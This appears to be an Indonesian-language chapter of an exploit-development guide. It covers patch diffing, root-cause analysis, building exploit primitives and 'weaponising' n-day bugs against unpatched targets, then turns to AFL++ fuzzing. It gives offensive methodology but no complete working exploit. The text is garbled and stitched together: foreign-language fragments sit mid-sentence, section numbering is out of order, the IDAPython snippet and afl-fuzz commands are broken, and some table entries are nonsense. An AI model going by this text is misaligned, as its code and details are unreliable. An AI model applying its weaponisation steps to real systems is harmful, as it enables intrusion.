1. **Binary source tidak tersedia**: hadapi kemungkinan vendor tidak merilis symbol. Gunakan cấu hình heuristic di BinDiff (fuzzy matching, structural hashing) untuk menemukan fungsi yang sama jika stripped.

2. **Compiler difference**: paksa binary comparison dengan flags yang tepat. Perbedaan compiler (Clang vs MSVC) atau optimization level akan membingungkan diffing. Untuk enterprise build (MSVC, clang-cl), pastikan target yang dibandingkan compile dengan toolchain serupa.

3. **HEVD-style "practice" menyesatkan**: kebanyakan CTF/labs (HEVD) menggunakan arbitrary write primitive yang guaranteed — dunia nyata sering primitive yang incomplete atau unreliable (misal need heap grooming £60% reliability).

4. **Weaponization premature**: Jangan mulai build ROP chain sebelum primitive stabil. Banyak CVE dengan public PoC crash, tetapi exploit stabil butuh bulan additional research (heap layouts, race conditions). Jika engagement timeline 2 minggu, pilih CVE yang sudah ada reliable exploit atau that primitive adalah arbitrary write.

5. **Fingerprint error**: pastikan verifikasi versi target sebelum pengiriman exploit. Versi minor yang berubah (upgrade patch) bisa memerlukan rebuild ROP gadgets. Gunakan `searchsploit`, `nuclei`, atau manual banner parse sebelum eksploitasi.

6. **Sandbox escape diperlukan**: Untuk browser exploit, render process adalah low-privilege sandbox (renderer). Ini berarti satuk native-code execution di renderer TIDAK cukup untuk full control — sebut-mention CVE chain (renderer + browser process). Untuk enterprise targets, hal seperti nginx worker/root process atau Windows service context lebih langsung.

## 1. Patch Diffing

### 1.1 Kapan dipakai

- Vendor rilis security update **tanpa advisory detail** (mis. Microsoft Patch Tuesday, Adobe APSB tanpa CVE description, Oracle CPU).
- Advisory ada tapi tidak menyebut fungsi/lokasi bug.
- but 1-day turn: target n-day, patch sudah keluar, korban belum patch.

### 1.2 Toolchain

| Tool | Platform | Input | Output | Catatan versi |
|---|---|---|---|---|
| BinDiff 8/9 (Zynamics) | Binary (via IDA 8.4+, Binary Ninja, Ghidra via BinExport) | 2× .BinExport | .BinDiff, difflist, function similarity | Plugin BinExport 1.28+ untuk IDA 9 |
| Diaphora 2.0.x | IDA (utama), Ghidra (port) | 2× SQLite per-binary | HTML best/partial matches, funcmp | Gratis, lebih noisy tapi lebih banyak heuristic |
| DarunGrim 3 | Windows PDB/binary | 2× file hash | Windiff-style diff | Legacy, pakai untuk MS binary dengan PDB jika BinDiff license mepet |
| Ghidra 11.x (Built-in Version Tracking) | Binary/source | 2× Ghidra projects | Function matches + markers | Gratis, cocok untuk firmware |

### 1.3 Rekap workflow diffing

```bash
# 0. Ambil binary pre/post patch
#    Contoh Oracle: CPU Juli vs CPU Oktober; compare component .jar → dump native libs
#    Contoh Windows: KB sebelum vs sesudah, extract:

mkdir kb_old kb_new
cd kb_old && wget "http://download.windowsupdate.com/.../windows11.0-kb5034123-x64.msu" -O kb.msu
expand.exe kb.msu . -F:*.psf . && expand.exe *.psf . -F:*.dll 2>/dev/null

# 1. Export BinExport di IDA:
#    File → Produce file → BinExport database → save .BinExport per binary
# 2. BinDiff:
bindiff.exe old.dll.BinExport new.dll.BinExport old_vs_new.BinDiff
# 3. Buka .BinExport di BinDiff UI → sort: "相似度" 0.55–0.95 + changed instructions 5–40
```

### 1.4 Apa yang dikirim vs apa yang muncul

| Dikirim | Muncul | Kenapa berhasil/gagal |
|---|---|---|
| 2 binary identik build-nya (satu SHA dari vendor), hanya patch beda | Diff kecil, target 5–50 fungsi berubah | Berhasil: compiler/toolchain/version identik |
| Binary versi jauh berbeda (mis. 1.2 vs 1.9) | Ribusan false positive | Gagal: refactor, LTO, compiler version beda → apur noise |
| Binary hanya berubah compiler flag, bukan logic | Diff besar tapi semuanya dibangun ulang | Gagal: PGO / hotpatch / CFG recompile membuat semua fungsi "berubah" |

Trik eliminasi noise: kalau vendor merilis security-only hotfix (mis. Chrome 131.0.6778.205 vs .264), bandingkan hanya file yang SHA berubah — jangan diff full installer.

### 1.5 Sinyal patch keamanan pada diff

- Penambahan bounds check, `memcpy` size clamp, atau `CHECK` baru sebelum akses array.
- Integer overflow handling: `if (len > UINT32_MAX - x)` yang muncul.
- UAF patch: tambahan `RefPtr<>` / `std::shared_ptr` / `kernel_object_get` bersama, atau increment refcount sebelum callback.
- Validasi input yang di-*moved* sebelum alur logika (input check dipindah lebih awal, biasanya refactoring demi keamanan).
- Nama fungsi baru mengandung `validate`, `sanitize`, `check_overflow`.
- Perubahan struct layout/size buffer (harus cek diff di data section juga): alignment +8 byte, atau magic constant +256 pada alokasi buffer.

Untuk binary dengan PDB/symbol: diffing .data section / RTTI / string references lebih penting daripada asm — string error message baru sering mengungkap letak fungsi rentan.

### 1.6 BinDiff vs Diaphora, kapan pakai yang mana

| Kriteria | BinDiff | Diaphora |
|---|---|---|
| Accuracy untuk binary besar (>50MB, enterprise client) | Lebih cepat dan stabil, butuh license zynamics | Cenderung lambat, lebih banyak tanpick (variable renumbering) |
| Binary compiler beda (LLVM vs ELF ARM) | Perlu setting "fingerprints" mode | Menghasilkan banyak "unreliable matches" tapi heuristik pseudocode lebih tahan |
| Ketersediaan multi-platform (macOS, Windows patch target) | Perlu BinExport spesifik platform | Bisa IDA macOS/Windows/Linux, ekstensi relativistik "viewed" |
| Verifikasi diff ada kode diedit manual | Tidak bisa edit | Tidak bisa, tapi bisa label fungsi berbeda untuk keperluan pelaporan |

### 1.7 Rekap tingkatan sinyal spesifik per jenis bug

| Bug | Tanda di patch |
|---|---|
| Memory corruption | `memcpy`, `memmove`, `memcpy_s` baru muncul; size check ditambah |
| UAF | Refcount tambah; std::ptr baru; `delete` dipindahkan setelahnya |
| Logic (auth bypass) | IF condition + kebalikan disesuaikan |
| Command injection | `execve`, `popen` dibungkus sanitasi |
| SSRF | IP/netmask check sebelum fetch |
| Path traversal | `sanitize_path`, prefix check (Linux `..`, Windows: `GetFullPathName` baru) |

Jika diff menunjukkan 800+ fungsi berubah semua di lingkup 1–2 modul (khususnya software vendor: Solaris, Oracle WLS, ICS tools), stop diffing—implementasi kompilasi ulang total (rebuild dari source setelah patch refactor) dan harus fallback ke heuristik nama variabel / sumber leak (bug bounty, oracle file, blog post).

---

## 2. Root Cause Analysis

### 2.1 Workflow umum

1. **Ambil fungsi diff** → libatkan fungsi *caller / caller-caller* (BinDiff menampilkan CallGraph).
2. **Definisikan taint input** — dari manakah user-controlled input masuk (HTTP header, file path, network protocol offset, file magic).
3. **Dinamis-analysis** — fuzzer, sanitizer, atau manual debugging dengan input crash PoC:
   - Linux: gdb + ASan build (`gcc -fsanitize=address`), atau clang `-fsanitize=memory,fuzzer`.
   - Windows: WinDbg + AppVerifier + PageHeap (`!heap -p -a <addr>`, `gflags /p /enable binary.exe /full`).
   - JavaScript (bug V8/JSC): d8 dengan `--allow-natives-syntax`, atau `--print-bytecode --trace-turbo`.
4. **Diverifikasi: apakah patch yang terakhir memperbaiki bug yang kita temukan?** kadang kita menemukan bug lain yang tidak dipatch — menarik tapi itu bagian bug collection.

### 2.2 Contoh root cause classification

| Kategori | Contoh di field |
|---|---|
| Integer overflow → buffer alloc kecil → heap overflow | Length parsing di network daemon (mis. sejenis bug di nginx module pihak ketiga), offset handling di protocol |
| Missing bounds check | Parser image/file (mis. bug parser font di kernel Windows, "Win32k"), hex parser |
| Type confusion | V8 Map transition, coreclr MethodTable (coreclr versi < 4) |
| UAF | DOM element + JS callback (browser), timer + free di network daemon |
| Logic / auth bypass | Perbandingan string strcmp non-constant, `==` di password check (developer mistake, non-exploit-heavy tapi mudah) |

### 2.3 Contoh kongkrit root cause + tanda

**Contoh: heap overflow karena integer truncation**

```c
// pre-patch
size_t read_len;
int32_t header_len;
read(fd, &header_len, 4);  // 0x7FFFFFFF
char *buf = malloc(header_len + 8);        // OK, 0x80000006
size_t overflow_amount = user_controlled;   // dari body
// ...
memcpy(buf, data, header_len + MAX_PADDING);
// post-patch menambahkan:
// if ((size_t)header_len + MAX_PADDING > (size_t)header_len + 8) abort();
```

Root cause: `header_len` adalah `int32_t`, tapi digunakan dalam operasi `size_t` → pada 32-bit sign-extension tidak terjadi di sini tapi pattern umum.

**Contoh: UAF**

```c
// pre-patch (pseudocode, misal pola di nginx modul upstream atau daemon C)
struct session *s = malloc(sizeof(*s));
register_callback(cb, s);
s->fd = accept();
process(s);
free(s);
// callback jalan di event loop setelah free → UAF

// post-patch:
// free dikeluarkan, atau refcount s->ref++ sebelum callback
```

Tanda patch: fungsi diff menunjukkan `free()` dipindahkan setelah `callback` atau muncul `if (--refcount == 0) free(...)`.

---

## 3. Primitive Development

Primitive adalah kapabilitas yang didapat *setelah* crash: apa yang bisa dikendalikan penyerang.

| Primitive | Kapan muncul | Next step |
|---|---|---|
| Null dereference (crash-only) | Pointer freed → NULL deref | Command injection virtual, umumnya DoS |
| Relative-add OOB | Array bawah size salah → arbitrary write relative addrs | Heap grooming lalu hijack pointer function/vtable |
| UAF | Heap object accessible pasca-free | Heap spray, realokasi dengan objet yang dikontrol → fake object → arbitrary read/write |
| Arbitrary write | Semua di atas yang stabil | Direct payload (ROP chain, function pointer overwrite, tanpa ASLR bypass jika infoleak tersedia) |
| Infoleak | Arbitrary read / pointer di error message | Bypass ASLR, hitung libc/base |
| Type confusion | Object confusion di browser / interpreter JS | Jalankan via JIT, common pada Chrome/V8 dan Safari/JSC |

## 8.5 Patch Diffing padaArsitektur Modern

### 8.5.1 Bit-per-Bit vs Bytecode Comparison

**Jebakan umum**: membandingkan binary yang dikompilasi ulang dengan compiler berbeda akan menghasilkan ratusan "perbedaan" artefak kompilasi yang tidak relevan.

| Compiler/Build | Tingkat Noise | Strategi Diffing |
|---|---|---|
| Identical compiler/flags | Rendah | BinDiff cut-off 0.5–0.7 cukup |
| Patch/SPF berbeda | Tinggi | Gunakan structural hashing + function matching manual |
| PGO/LTO enabled | Sangat tinggi | Fokus pada diff function-level, bukan basic block |
| Static linked runtime | Sedang–tinggi | Buat whitelist library bloat oleh keduanya |

**Teknik praktis crash-tolerant diffing**: identifikasi timestamp di PE header. Jika hanya `TimeDateStamp` dan linker version berbeda, kemungkinan besar code section hanya berisi perubahan minimal patch saja — kondisi ideal. Jika linker/compiler version berubah (mis. MSVC 2015 → 2019), siap-sikan menghadapi false positive massal.

### 8.5.2 Address Layout-Aware Diffing untuk ASLR-Hardened Binary

Produk enterprise modern (VMware ESXi, Sharepoint, Exchange) menggunakan PGO yang mengubah code layout secara non trivial. Strategi:

1. **Bindiff pada stripped symbol**: gunakan BinExport → BinDiff dengan confidence threshold rendah (0.3)
2. **Cross-referencing string references**: identifikasi string dominan di versi lama & baru, bandingkan fungsi yang memanggilnya
3. **Structual hash**: match `function hash` (isyarat menghitung op-code dasar, bukan address)

## 8.6 Root Cause AnalysisMultiple Vulnerability Classes

### 8.6.1 Tabel Mapping: Primitif Berdasar Vulnerability Class

| Vulnerability Class | Primitive dasar | Eskalasi primitive lanjut |
|---|---|---|
| OOB Read | Info leak (heap dump) | Pointer leak → bypass ASLR/PIE |
| OOB Write | Adjacent object corruption | Metadata corruption → arbitrary R/W |
| UAF | Type confusion (object reuse) | Overlapping allocation → R/C control |
| Stack overflow | RIP control (klasik) | ROP chain liner |
| Double free | Corrupt tcache/bins | Tcache poisoning → arbitrary alloc |
| Integer overflow | Heap over-alloc | Repack → heap overflow |
| Format string | Arbitrary read (stack) | GOT overwrite/sandbox escape |
| SSRF | Prompt response/injection (SSTI/server-side template) | Metadata service attack / RPC bind |

**Perhatikan cross-class chaining**: banyak CVE yang dipublikasikan sebenarnya multi-bug (mis. bug overflow disertai bug info-leak tersembunyi). Patch diffing sering menunjukkan patch menutup dua jalur sekaligus — perlu dijauhi asumsi bahwa primitive tunggal cukup.

### 8.6.2 Patch Diff → Vulnerability Class dengan Diaphora

Diaphora menghasilkan metric `ratio` dan match type:

- **Best-Match tapi ratio turun drastis** (mis. 0.95 → 0.65): biasanya fix bug overflow (size check ditambahkan, loop berubah)
- **Unmatched di satu sisi saja**: fungsi baru — bisa fixer helper (_validator, sanitizer) atau fungsi refactor
- **Call graph change**: fungsi lama memanggil `memcpy` langsung, versi baru memanggil `sub_safe_memcpy` — pointer kuat ke OOB write fix
- **Bogus function names/mangled symbol ideal**: membandingkan `!memcmp` string terhadap C++ symbol memberi prioritas hook

## 8.7 Contoh Alur Ujung-ke-Ujung: CVE Eksploitasi Enterprise n-day

### Studi kasus: SQL Injection auth bypass di aplikasi web enterprise (pattern CVE umum: Spring/Oracle/Atlassian)

**Scenario**: vendor menerbitkan fix "input validation". Binary target adalah aplikasi Java (jar) — patch diffing pada bytecode.

1. **Mapping 8.7 framework — tahap-tahapan diff timeline:**
   1. Unduh vulnerable & fixed (mis. `app-1.2.3.jar` vs `app-1.2.4.jar`)
   2. `jardiff` decompiler: `jadx-gui` atau binary diffing pada bytecode via [Recaf](https://github.com/Col-E/Recaf) — diffing di class/method-level
   3. Perubahan menunjukkan route baru `validateXxx()` di controller
   4. Root cause: input parameter dimasukkan ke query tanpa prepared statement
   5. Primitif: SQLi → auth bypass → query admin
6. **Weaponisasi**: PoC **blind** (boolean-based) or manual
 7. Rilis checklist: mitigasi env (WAF rule, virtual patch) → defensive report — jadikan bagian dari security-publish workflow (sem breaking changes harus dicatat)

#### 8.7.2 Contoh Memory Corruption: UAF di Paket Middleware (mis. pola broker messaging native)

**Terrain**: C/C++ binary, vendor menerbitkan hotfix binary tanpa rebuild penuh — kondisi ideal patch diffing.

| Tahap | Tool | Sinyal/Sinyal kunci |
|---|---|---|
| 1. Sample | `old.bin` / `new.bin` | Cek PDB time, linker version identik |
| 2. BinDiff | BinDiff/BinExport | Match confidence 0.99 untuk >95% fungsi, fokuskan diff |
| 3. Sinyal 1 | BinDiff | Fungsi `alloc_obj` → penambahan `track_owner()` |
| 4. Sinyal 2 | BinDiff | `free_obj()` → addition counter decrements / re -ref → **refcount fix → klasik UAF fix pattern** |
| 5. Root cause | IDA Pro + marker | Refcount missing at error path (retry/timeout) → free double-potent |
| 6. Primitive | IDA Pro + fuzzing | Uaf trigger: alloc/free sprays menunjukkan 32-byte object di fastbin/tcache reusable |
| 7. Primitive eskalasi | GDB + heap feng shui | Object reuse → obj berisi function pointer → **RIP control** |
| 8. Weaponisasi | exploit script / Metasploit | spray + trigger path; remote context (service listening) |

**Jebakan penting** (UAF-specific):
- Jangan asumsikan chunk reuse berjalan sama antara debug & release binary — cache glibc versi produk mungkin berbeda
- Deterministik reproduksi heap: gunakan **heap spray via input field yang persistent** (mis. queue entries), bukan fresh request
- Watch out: **allocation di thread berbeda** — arena behavior berbeda antara main thread vs worker; bila plugin worker memproses trigger, butuh tuning spray terpisah

### 8.7.3 Windows Enterprise Context: LPE via Kernel driver diff

Pola khas driver KMDF vendor enterprise tak jarang mengalikan objek handle:

1. `BinDiff`: diff menunjukkan tambahan `ObReferenceObjectByHandle` pada IOCTL path
2. Root cause: missing ref-check → **TOCTOU** di handle dereference
3. Alur analisa:
  - Primitive: double dereference → user-control timer object pada free
  - Weapon: exploit mengubah timer state via freed user alloc (pattern pasti ingat **CVE pada Windows Kernel callback pattern**)
4. Catatan **Hardened by HyperGuard (HVCI)**: kernel exploit perlu mematuhi: (a) instruksi invalid, (b) executable memory absent; sehingga tahap weapon biasa butuh **data-only attack** (mengubah token/ACL alih-alih injeksi shellcode)
5. Post-weapon check: driver signature enforcement aktif oleh kewajiban memuat driver test-signed adalah jebakan outdoor/environment — exploit n-day ini di bawah DSE di customer environment tidak dapat test-load arbitrary driver

### 8.7.4 Edge Case Terbaru (2023–2024 Patterns)

| Edge Case | Dampak pada Diff Workflow | Mitigasi |
|---|---|---|
| **CFI/arm64e** (Apple Silicon) | Primitive bypass point tidak menunjuk ke shellcode | Pakai JOP/data-only primitive |
| **Sandbox tebangan** (Chrome/V8) | Patch pada satu V8 tier (interpreter) tidak cukup | Verifikasi primitive pada Ignition & TurboFan; diff tier pipeline (object map deopt pun dapat) |
| **.NET Native AOT enterprise app** | Metal code strip reflectively; symbol bloat absent | Pastikan bindiff dengan relocation-intact binaries (`.reloc`) |
| **Rust-written services / enterprise rewriting core** | Panik pattern: expect `check_add`/`expect_none` on unwrap | Perhatikan diff pada `unwrap` growth — Rust panic handling path jangan diabaikan; panic bisa berarti primitive |
| **eBPF hooks pada Linux enterprise** | Fix mungkin hanya BPF verifier rule update, bukan kernel code fix | Diffing tidak berguna; audit rule/verifier diff via source |
| **Patchbackporter** ("silent fix" style Microsoft) | Fix memenuhi stable tree tanpa CVE assignment; bg diff spotting lebih penting | Untuk kernel vendor Linux OS "enterprise" (RHEL/Oracle) — diffing upstream stable patch queue (`git log` cek), bukan binary diff |

## 8.8 Batch/Repeatable Pipeline Untuk n-day Tracking

**Alur Otorkestra 8.8 (sistematis):**

```text
[VulnDB Feed/Patch Tuesday]
     ├─ (1) Inventory mapping: apakah produk terdampak? (CPE/kev)
     ├─ (2) Sample fetch otomatis: sebelum/sesudah versi (MSI, tar, repo)
     ├─ (3) Diff engine: BinDiff headless batch zynamics_bindiff_headless
     │      Diaphora (SQLite export JSON) / diff dumping opcode di Java (AQL)
     ├─ (4) Triage scoring: 
     │       - ratio drop besar + security-related names → P1 manual review
     │       - non-security helper changes → deprioritize
     └─ (5) PoC deve: manual analis stage (8.6 & 8.7 flow), plus \[vendor advisories\]
            → reporting: (CVE record update, product-consistency changelog)
```

**Login sistem triage untuk men-skip false positives:**
1. `function_name` berisi log/save/debug strings rendah prioritas
2. Tanda tangan LLVM/UBSan (`__ubsan_handle_*`, `_chk`) fix basah (compiler-inserted) — bukan logic fix vendor
3. Compat shim/thunk (obyek seperti `__CxxFrameHandler` delta)` — **Bukan** indikasi vuln

**Scoring formula sederhana untuk diff triage (internal CTF-adapted):**

```
score = (Δlines_changed_security_kw) × 3
      + (calls_to_dangerous_api_sebelum, tidak sesudah) × 5
      + (loop/uname boundary difference) × 4
      - (logging/testing/branch warning) × 2
```

Dangerous keycalls yang menyebabkan skor tinggi bila **dihapus atau parameter check elemen ditambah**: `memcpy, sprintf, strcpy, system, strlen (dengan heap access pattern), W/Unchecked (mmap), ExAllocatePool` (tanpa tag check), `crypto ops on buffers` dengan non-constant time changes.

## 8.9 Open Source vs Closed Source Patch Diffing Matrix

| Aspek | OSS (patch publik) | Closed source (enterprise) |
|---|---|---|
| Kualitas diff | Kode → ground truth | Probabilistik, false positive |
| Waktu-to-PoC | Jam→hari | Hari→minggu |
| Kolateral | Enable "silent patch" analysis (mis. vendor fix tanpa advisory) | CVE justification via vendor release note |
| Prediksi | Maintenance ─ diff automation trivial | Butuh BinExport + binary symbol server internal |
| Tools utama | `git diff`, semantic diff ([diff2html](https://diff2html.com), semdiff) | BinDiff, Diaphora, TurboDiff, d2d-comparator |

**Jebakan closed source**: vendor terkadang **bundle non-security vulnerability fix dengan behavioral feature** — jangan berasumsi folder/module diff setara satu CVE. `Binary diff scope ≠ CVE scope`. Acuan bila bundling besar: berkurang ke **release note keyword mapping** dan mencari lokal fungsi diff terkait keyword (auth, parse, unmarshal, encode).

## 8.10 Varian Teknik per Platform/Version

### 8.10.1 Diaphora pada Binary Tanpa Symbol (Stripped)

1. Expor option "Temporary by Address pada stripped snapshot"
2. Gunakan "Partial Matching" dengan minimum ratio 0.7 + `pragma demangled names`
3. Fokus pada fungsi berukuran 500+ instruction (fuzzy noise menurun secara proporsional di fungsi besar)
4. Gunakan "[donor function](https://github.com/joxeankoret/diaphora/blob/master/readme.md)" unik untuk seed matching

### 8.10.2 Non-x86 Enterprise (ARM/MIPS Perangkat Edge, Power)

- BinDiff support arsitektur ditentukan oleh capability of disassembler backend → IDA Pro Plugins multi-arch perlu active processor module
- MIPS enterprise firmware: perhatikan **delay slot** — perbedaan instruksi di delay slot pada patched branch akan tampak sebagai diff besar. Triangulasikan dengan mengabaikan +1 instruction pada branch detected
- ARM64 (Apple): pointer authentication pada function pointer UAF/ROP adalah mitigasi operator — patch diff tetap berfungsi, tapi weaponisasi butuh primitive compatible dengan signed pointers (bypass via gadgets yang menggunakan `braa`/`blraa` di dalam valid scope atau data-only corruption)
- RISCV (baru): IDA >=8.3 support adequate; Diaphora primers well

### 8.10.3 Diaphora pada Java/Kotlin (Enterprise JVM)

1. Pastikan file sebagai separate databases via `jd-gui` decompile diff (atau `javap -c` disasm)
2. Untuk berkas besar, lebih-ringan decompiler diff: `recaf`/`diff-jar` via  `Enjarify`+`Krakatau` compiler-byte a toolингase
3. Perhatikan fix pattern umum Java enterprise:
   - `String.format` → `MessageFormat` support (int-overflow formatting fix)
   - Stable pattern: reflection `setAccessible` → guarded metadata (deserialization fix)**
   - **Kotlin**: `lateinit` check addition → vuln NPE-related an enterprise API trust boundary

### 8.10.4 .NET Enterprise Binaries (DLL families, WCF, SharePoint add-ins)

1. Decompile via `ILSpy` setelah membongkar `dotfuscator`-protected varian:
2. Gunakan `de4dot` untuk obfuscation removal, kemudian diff IL via `ILMerge` disassembly set
3. Pattern untuk **Serialization fix pada** .NET: `BinaryFormatter` → cek `SerializationBinder` addition; `Newtonsoft.Json` TypeNameHandling pelaku umum (TypeNameHandling.Auto|All diff shock)

## 8.11 Operational Pitfall Catalog (Anti-Pattern)

### 8.11.1 Pitfall list Produk-Security-Research

Pitfall | Impact | Countermeasure | Severity |
|---|---|---|---|
| Asumsi symbol UP hasil BinDiff akurat 100% | Wrong root cause attribution | Cross-validate manual 3–5 fungsi sekitar primary diff; uji teori secara dinamis di lab | Tinggi |
| Patch tersebut juga mengubah format object/berkas yang sudah dikonsumsi client | Patch influences dirent mistrigger; n-day tampak "fixed" tapi mechanic berbeda | Verifikasi keys/format parsing sepenuhnya via repro network | Sedang |
| Fokus hanya pada fungsi terbesar diff | Menyebabkan vuln single-line-fix terlewat | Perhatikan juga diff-fitur **kecil tapi security-relevant**: single `add constant`, single `cmp` change | Tinggi |
| Menguji pada build distributions produk berbeda dengan customer | PoC tidak valid pada target deployment | Lab reproduksi **exact** deployment unit: OS version, service pack, signed binary customer | Tinggi |
| Skip artefak no symbol (thunk, PLT stub) | Menyebabkan salah mengira call consolidation sebagai patch | Whitelist PLT/ICF artifacts dari scoring | Rendah |
| Binary patched via detour/hook (bukan rebuild) | BinDiff akan menangkap JMP insertion sebagai diff besar | Izinkan vendor hot-patch pattern: patch-by-hook common enterprise (AIX/Oracle, SAP); bandingkan sebelum hooks dimatikan di runtime | Sedang |
| Mengabaikan multi-layer patch dependency | Fix aplikatie wymagana layer sebelumnya telah diaplikasikan | **Stack baseline**: pastikan fix terinstal dengan outstanding prerequisites | Sedang |
| Mengabaikan database/textfile config fix | PoC berputar-putar pada binary fix, padahal fix ada di SQL schema/ACL/script | Diff distribusi paket secara keseluruhan (manifest, checksum semua file). banyak "silent fix" ada pada loadable script (PowerShell/Mule/Java service). | Tinggi |

### 8.11.2 Pitfalls/Concerns — Legal dan Operational

- **Lisensi EULA patch-diffing** beberapa enterprise vendor melarang reverse engineering kepada produk patched (per vendor US DMCA 1201 & exceptions; UE Directive — legal review wajib terutama exploitation-in-depth). Mitigasi standar: fokus pada internal research, responsible disclosure via vendor PSIRT channelsekuritas pelanggan di korespondensi – bukan exploit publik.
- **Environment isolation**: lab untuk exploit deve harus network-isolated; menemukan crash di sistem produksi tanpa ISP snapshot menyebabkan perangkat recovery: gunakan snapshot pre-test mandatory (VM full state).
- **Koordinasi CNA/CVE mis-publish**: beberapa CVE mendapatkan deskripsi yang salah setelah patch analysis (mis. sekarang CVE mengandung beberapa varian bug fix yang berbeda). Pastikan analisa community share ke NVD jika MVP fix pertama information menindikasi CVE forked.
- **Target hash stability**: patch distribution pipeline vendor kadang mengirim binary identik dengan timestamp/padding di build ulang yang menyebabkan **false positive diff noise**: filterkan dengan pre-normalization (cut header timestamp field; align sections).

## 8.12 Command/Cheatsheet — Patch Differencing Quick Reference

### 8.12.1 BinDiff CLI batch

```bash
# Export IDA (headless) ke BinExport
idat64 -A -B -o"old.BinExport" old.dll
idat64 -A -B -o"new.BinExport" new.dll

# Bindiff headless pair
$BINDIFF/bin/bindiff --primary=old.BinExport --secondary=new.BinExport -x diff.BinDiff
```

### 8.12.2 Diaphora metadata scan

```bash
# Ekspor SQLite (diaphora) per binary via IDA/ Ghidra script
python diaphora.py old.i64 --session-name=old
python diaphora.py new.i64 --session-name=new
# lalu diffing pada GUI; fungsi "Best/partial match" dan fitur
#   selisih algorithm (`pseudo-code`) — kolom "Callers/Callees" berubah adalah hotspot analisa
```

### 8.12.3 Ekstraksi cepat fitur-fix signature

```bash
# Quick tell: cari fungsi yang his call ke memcpy di versi lama, tidak di baru 
# contoh IDAPython
import idautils, idc, idaapi
for f in idautils.Functions():
    if "memcpy" in ", ".join(idc.get_func_name(c) for c in idautils.CodeRefsTo(f, True),):
        print(hex(f), idc.get_func_name(f))
```

## 8.13 Checklist Root-Cause → Primitive Document

Sebelum publish/library internal, checklist berikut waji**b terisi** (post-analysis template):

- [ ] Patch sampel identik versi target customer dipastikan (build hash pre/post)
- [ ] Diff triage score & top-10 anomali listed
- [ ] Root cause: vulnerable code path minimal satu komplet trace (source symbol/line/address pre-post)
- [ ] Trigger condition: input minimal + state minimal (unauthenticated? domain user? API version?)
- [ ] Primitive: dinyatakan eksplisit (read/write/alloc/what offset), bukan hanya "crash"
- [ ] Stability & determinism: PoC reproducibility rate ≥ 80% (10-run baseline)
- [ ] Score/model assumptions terdokumentasi (mis. "asumsi glibc tcache; tidak berlaku tcache off/older glibc")
- [ ] Bypass mitigasi dianalisa (mitigations table: DEP/ASLR/CFI/HVCI/VBS mapping) dengan status primitive per-mitigation
- [ ] Post-PoC sanitasi: lab snapshot restored, no artifacts pada enterprise di luar lab

Bagian berikutnya: **8.14 Weaponisasi Lanjutan: dari Primitive Stabil ke Eksploit Berkelanjutan** — mencakup modularity exploit (stager/stage design), loading PRs per target area (Java native lib, kernel driver/service), suppress-crash-forensics, dan framework publikasi internal (report request ke vendor basis CVE template).

## 1. AFL++ (v4.x)

### 1.1 Build Target dengan Instrumentasi

```bash
# Ubuntu 22.04 / 24.04
sudo apt install build-essential python3-dev automake cmake libtool \
  libglib2.0-dev libpixman-1-dev python3-setuptools cargo nasm
git clone https://github.com/AFLplusplus/AFLplusplus && cd AFLplusplus
make all -j$(nproc)

# Kompilasi target dengan clang + AFL
export CC=clang CXX=clang++
./configure --disable-shared
make -j$(nproc)
```

Tiga mode instrumentasi:

| Mode | Perintah | Kapan Dipakai |
|---|---|---|
| Classic | `CC=clang AFL_USE_ASAN=1 ./configure` | Kode C/C++ normal |
| LTO (mode default efisien) | `AFL_LLVM_LAF_ALL=1 CC=afl-clang-lto` | CFG coverage lebih baik, target Linux x86_64 |
| Frida (binary-only) | `afl-fuzz -i in -o out -- ./bins/fuzzed_target @@` | Target closed-source / Windows binaries |

### 1.2 Persistent Mode

**Apa yang dikirim:** Satu proses fuzzing menangani banyak input tanpa `fork()` per test case.

**Harness contoh (parser JSON/file):**

```c
// target_lib.c — fungsi yang di-fuzz
int parse_header(const uint8_t *buf, size_t len);

// persistent harness
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "target_lib.h"

__AFL_FUZZ_INIT();

int main(void) {
    __AFL_INIT();
    unsigned char *buf = __AFL_FUZZ_TESTCASE_BUF;
    long len = __AFL_FUZZ_TESTCASE_LEN;

    while (__AFL_LOOP(10000)) {        // 10k iterasi per restart
        parse_header(buf, len);
    }
    return 0;
}
```

Build:
```bash
afl-clang-fast++ target_lib.c harness.c -o fuzz_target -fsanitize=address
afl-fuzz -i seeds/ -o out/ -x dict.txt -- ./fuzz_target
```

**Kenapa berhasil:** Hilangkan biaya fork + exec per input. Throughput dari ~500 exec/s naik ke **50k–500k exec/s** tergantung target. SATOL menjaga mutasi deterministik tetap valid.

**Kenapa bisa gagal:** State target bocor antar iterasi (buffer tidak di-reset, global variable ter-polusi). Fix: reset state di awal loop, matikan hardware watchdog jika target call `exit()`/`abort()`.

### 1.3 Dictionary

**Apa yang dikirim:** File keyword `.dict` yang diinjeksi sebagai mutasi atomik.

```bash
# Format
magic="\x00\x00\x01\xB8"
kw_mime="Content-Type"
kw_json_open="{\":["
kw_nullterm="\x00"
```

```bash
afl-fuzz -i in -o out -x http.dict -- ./target @@
```

**Kenapa berhasil:** Parser state machine menunggu magic bytes/string literal sebelum cabang dalam terbuka; random mutation hampir tidak pernah menghasilkan literal panjang. Dictionary memangkas waktu dari jam ke menit.

**Kenapa gagal:** Dictionary terlalu besar (>beberapa ratus entri) melambatkan scheduler; keyword yang salah format (escape `\x` vs raw bytes) — validasikan dengan:

```bash
afl-showmap -i dict_test/ -o /dev/null -- ./target
# bandingkan tuple coverage pre/post dictionary
```

### 1.4 CMPLOG

**Apa yang dikirim:** Target di-link dua kali: binary normal + binary CMPLOG. AFL++ mengintersepsi instruksi perbandingan (`cmp`, `strcmp`, memcmp) dan mencatat nilai operan.

```bash
afl-fuzz -i in -o out -c ./target_cmplog_build -- ./target_asan
```

**Apa yang muncul:** Saat mutasi menghasilkan operan yang cocok dengan nilai yang ter-log, cabang baru terbuka. Contoh klasik: `if (memcmp(hdr, "MAGICKEY", 8) == 0)` — CMPLOG mengekstrak `"MAGICKEY"` dari runtime.

**Kenapa berhasil:** Mengatasi keterbatasan dictionary statis untuk nilai yang dinamis (checksum, magic yang di-derive).

**Kenapa gagal:** Operan adalah hasil komputasi (XOR, hash) — CMPLOG hanya melihat *hasil akhir* di register saat compare, bukan operan input mentah. Untuk checksum aja butuh laf-intel transform ops (`AFL_LLVM_LAF_TRANSFORM_CALLS`) atau custom comparison pass — dan itu pun sering tidak cukup untuk CRC32/crypto hash.

### 1.5 Perintah Operasional AFL++

```bash
# Parallel fuzzing, 4 core
afl-fuzz -i seeds -o out -M main -x dict.dict --/bin ./target @@
afl-fuzz -i seeds -o out -S s2 --/put ./target @@
